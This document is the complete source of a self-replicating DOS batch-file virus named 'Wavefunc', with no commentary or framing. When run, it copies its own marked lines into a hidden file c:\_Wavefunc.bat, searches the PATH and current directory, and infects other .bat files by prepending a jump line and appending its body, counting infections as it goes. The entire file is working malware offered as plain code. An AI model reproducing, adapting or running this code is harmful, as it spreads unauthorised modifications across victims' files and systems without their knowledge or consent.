@if '%_vir%==' goto _vir
::**** HOST ****
@if not '%_vir%==' goto Wavefuncend
:_vir Wavefunc
@echo off%_Wavefunc%
if '%1=='Wavefunc goto Wavefunc%2
set Wavefunc=%0.bat
if not exist %Wavefunc% set Wavefunc=%0
if '%Wavefunc%==' set Wavefunc=autoexec.bat
set !Wavefunc=%1 %2 %3 %4 %5 %6 %7 %8 %9
if exist c:\_Wavefunc.bat goto Wavefuncg
if exist %Wavefunc% goto Wavefuncfe
call %Wavefunc% Wavefunc h %path%
if exist %Wavefunc% goto Wavefuncfe
goto eWavefunc
:Wavefunch
shift%_Wavefunc%
if '%2==' goto Wavefuncend
if exist %2\%Wavefunc% set Wavefunc=%2\%Wavefunc%
if exist %2%Wavefunc% set Wavefunc=%2%Wavefunc%
if exist %2\%Wavefunc%.bat set Wavefunc=%2\%Wavefunc%.bat
if exist %2%Wavefunc%.bat set Wavefunc=%2%Wavefunc%.bat
if not exist %Wavefunc% goto Wavefunch
goto Wavefuncend
:Wavefuncfe
find "Wavefunc"<%Wavefunc%>c:\_Wavefunc.bat
attrib c:\_Wavefunc.bat +h
:Wavefuncg
command /e:5000 /c c:\_Wavefunc Wavefunc vir
:eWavefunc
call %Wavefunc% Wavefunc rh
set _vir=>nul.Wavefunc
set !Wavefunc=
set Wavefunc=
goto Wavefuncend
:Wavefuncrh
set _vir=x%_Wavefunc%
%Wavefunc% %!Wavefunc%
:Wavefuncvir
for %%a in (*.bat) do call c:\_Wavefunc Wavefunc i %%a
exit Wavefunc
:Wavefunci
find "Wavefunc"<%3>nul
if not errorlevel 1 goto Wavefuncj
echo @if '%%_vir%%==' goto _vir>Wavefunc$
type %3>>Wavefunc$
echo.>>Wavefunc$
type c:\_Wavefunc.bat>>Wavefunc$
move Wavefunc$ %3>nul
set Wavefunc#=%Wavefunc#%1
if %Wavefunc#%==11 exit
:Wavefuncj
set Wavefunc!=%Wavefunc!%1
if %Wavefunc!%==1111111111111 exit
:Wavefuncend
